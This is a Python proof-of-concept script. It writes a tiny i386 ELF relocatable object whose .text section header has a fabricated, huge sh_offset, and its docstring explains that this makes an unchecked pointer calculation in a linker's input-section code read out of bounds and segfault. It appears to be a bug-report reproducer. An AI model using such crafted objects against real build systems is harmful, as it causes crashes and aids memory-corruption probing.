#!/usr/bin/env python3
"""Writes a minimal x86 (i386) ET_REL ELF object with one SHF_ALLOC ".text" section whose
sh_offset field is a fabricated, huge value (0x7FFFFFF0) - far beyond the real (tiny) file.
InputSection<E>::InputSection() (src/input-sections.cc) computes
`contents = file.mf->data + shdr().sh_offset` with no bounds check at all, so `contents` becomes
a wild pointer. During output writing, InputSection::copy_contents_to() does
`memcpy(buf, contents, sz)`, dereferencing that wild pointer directly - SIGSEGV. No relocations,
symbols, or special content are needed to trigger this - any SHF_ALLOC section with a bogus
sh_offset is enough.
"""
import struct
import sys

SHT_PROGBITS = 1
SHT_STRTAB = 3
SHF_ALLOC = 2


def shdr(name, type_, flags, addr, offset, size, link, info, addralign, entsize):
    return struct.pack("<10I", name, type_, flags, addr, offset, size, link, info, addralign, entsize)


def build() -> bytes:
    names = b"\x00"

    def addname(s):
        nonlocal names
        off = len(names)
        names += s.encode() + b"\x00"
        return off

    n_text = addname(".text")
    n_shstrtab = addname(".shstrtab")

    EHDR_SIZE = 52
    SHDR_SIZE = 40

    off = EHDR_SIZE
    off_shstrtab = off
    off += len(names)
    pad = (-off) % 4
    off += pad
    off_shdrs = off

    LIE_OFFSET = 0x7FFFFFF0  # huge, will land far outside the real mmap'd file

    sh_null = shdr(0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
    sh_text = shdr(n_text, SHT_PROGBITS, SHF_ALLOC, 0, LIE_OFFSET, 16, 0, 0, 1, 0)
    sh_shstrtab = shdr(n_shstrtab, SHT_STRTAB, 0, 0, off_shstrtab, len(names), 0, 0, 1, 0)

    e_ident = b"\x7fELF" + bytes([1, 1, 1, 0]) + b"\x00" * 8  # ELFCLASS32, ELFDATA2LSB
    ehdr = e_ident + struct.pack(
        "<HHIIIIIHHHHHH",
        1,   # e_type = ET_REL
        3,   # e_machine = EM_386
        1,   # e_version
        0,   # e_entry
        0,   # e_phoff
        off_shdrs,  # e_shoff
        0,   # e_flags
        EHDR_SIZE,
        0,   # e_phentsize
        0,   # e_phnum
        SHDR_SIZE,
        3,   # e_shnum
        2,   # e_shstrndx
    )
    assert len(ehdr) == EHDR_SIZE

    return ehdr + names + b"\x00" * pad + sh_null + sh_text + sh_shstrtab


def main() -> None:
    out_path = sys.argv[1] if len(sys.argv) > 1 else "evil.o"
    with open(out_path, "wb") as f:
        f.write(build())


if __name__ == "__main__":
    main()
